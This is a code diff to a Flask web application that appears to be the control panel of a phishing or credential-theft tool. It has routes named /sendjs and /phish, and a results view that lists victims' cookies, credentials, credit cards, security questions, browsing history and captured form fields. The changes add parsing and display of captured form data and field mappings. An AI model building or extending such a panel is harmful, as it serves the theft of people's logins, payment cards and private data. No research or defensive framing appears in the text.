@@ -6,6 +6,7 @@ from flask_login import logout_user, login_user, login_required, LoginManager, U
 from . import database, app
 from .app import app as app_flask, socketio
 from flask_socketio import SocketIO, emit
+import json
 
 
 login_manager = LoginManager()
@@ -69,6 +70,15 @@ def logout():
     return redirect(url_for('login', next=request.endpoint))
 
 
+
+@app_flask.route('/sendFormIDMappings', methods=['POST'])
+@login_required
+def sendFormIDMappings():
+    url = request.form['url_for_mapping']
+    mapping = request.form['mappings']
+    #updateFormMappings(url, mapping)
+    return '' + url + mapping
+
 @app_flask.route('/sendjs', methods=['POST'])
 @login_required
 def sendjs():
@@ -78,6 +88,11 @@ def sendjs():
     c = a + '\n' + b + '\n' + z
     database.add_js_cmd(b, z, a)
     return c
+
+@app_flask.route('/formTest', methods=['POST'])
+@login_required
+def testingForm():
+    return 'hi'
 
 @app_flask.route('/phish', methods=['POST'])
 @login_required
@@ -108,15 +123,27 @@ def getinfo():
         questions = cur.fetchall()
         cur.execute('SELECT * FROM ComplexForms WHERE CID = (%s)', (userid,))
         forms = cur.fetchall()
-
+        cur.execute('SELECT COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = (%s) AND COLUMN_NAME = (%s)', ('FormIDMappings','LocalDef'))
+        mappings = cur.fetchall()
         conn.close()
+    form_urls = [i[2] for i in forms]
+    forms = [i[1] for i in forms]
+    # forms = [i.split(', ') for i in forms]
+    forms = [json.loads(a) for a in forms]
+    # j=0
+    # for i in forms:
+    #     forms[j] = [data[0] for data in i]
+    #     j=j+1
+    keys = [list(i.keys()) for i in forms]
+    values = [list(i.values()) for i in forms]
 
-    forms = [i[1][1:-1] for i in forms]
-    forms = [i.split(', ') for i in forms]
-    j=0
-    for i in forms:
-        forms[j] = [data.split(':') for data in i]
-        j=j+1
+
+
+
+    mappings = mappings.__str__()
+    mappings=mappings[8:-6]
+    mappings = mappings.replace("'","")
+    mappings = mappings.split(',')
         # head = "url1\nurl2\nurl3\nurl4\nurl5\nurl6\nurl7\nurl8\nurl9\nurl10"
     # sites = head.split('\n')
     sites_in_html = []
@@ -128,7 +155,9 @@ def getinfo():
     #     head = [next(bh) for x in range(10)]
 
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh, forms = forms)
+                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh, forms = forms,
+                           keys = keys, values = values, mappings =mappings,
+                            urls = form_urls)
 
 #
 # def update_payload(id, text):
